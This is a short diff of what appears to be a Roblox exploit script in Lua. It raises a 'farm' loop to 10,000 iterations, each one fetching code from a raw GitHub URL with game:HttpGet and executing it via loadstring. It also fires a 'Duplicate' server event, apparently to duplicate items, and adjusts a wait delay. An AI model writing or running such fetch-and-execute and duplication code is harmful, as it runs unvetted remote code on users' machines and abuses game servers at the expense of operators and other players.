@@ -27,7 +27,7 @@ end)
 
 --farm
 coroutine.wrap(function()
-    for i = 1, 1000 do
+    for i = 1, 10000 do
         loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/test-public/refs/heads/main/TestInstant"))()
     end
 end)()
@@ -67,7 +67,7 @@ wait(1,5)
 
 game:GetService("ReplicatedStorage").Duplicate:FireServer()
 
-wait(15)
+wait(13)
 
 if not game:IsLoaded() then
     game.Loaded:Wait()
